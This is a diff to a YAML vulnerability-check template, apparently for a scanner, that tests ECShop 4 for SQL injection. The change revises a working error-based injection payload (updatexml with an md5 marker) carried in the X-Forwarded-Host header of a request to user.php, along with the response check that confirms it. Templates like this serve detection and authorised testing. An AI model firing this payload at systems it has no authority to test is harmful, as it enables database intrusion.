@@ -2,7 +2,7 @@ name: poc-yaml-ecshop4-sqli
 manual: true
 transport: http
 set:
-    r1: randomInt(444471, 444481)
+    r1: randomInt(10000, 99999)
 rules:
     r0:
         request:
@@ -10,9 +10,9 @@ rules:
             method: GET
             path: /user.php?act=collection_list
             headers:
-                X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953apay_log|s:39:"1' and updatexml(1,md5({{r1}}),1) and '";|
+                X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953apay_log|s:55:"1' and updatexml(1,insert(md5({{r1}}),1,1,0x7e),1) and '";|45ea207d7a2b68c49582d2d22adf953a
             follow_redirects: false
-        expression: response.body.bcontains(bytes(substr(md5(string(r1)), 5, 31)))
+        expression: response.body.bcontains(bytes(substr(md5(string(r1)), 1, 32)))
 expression: r0()
 detail:
     author: 曦shen
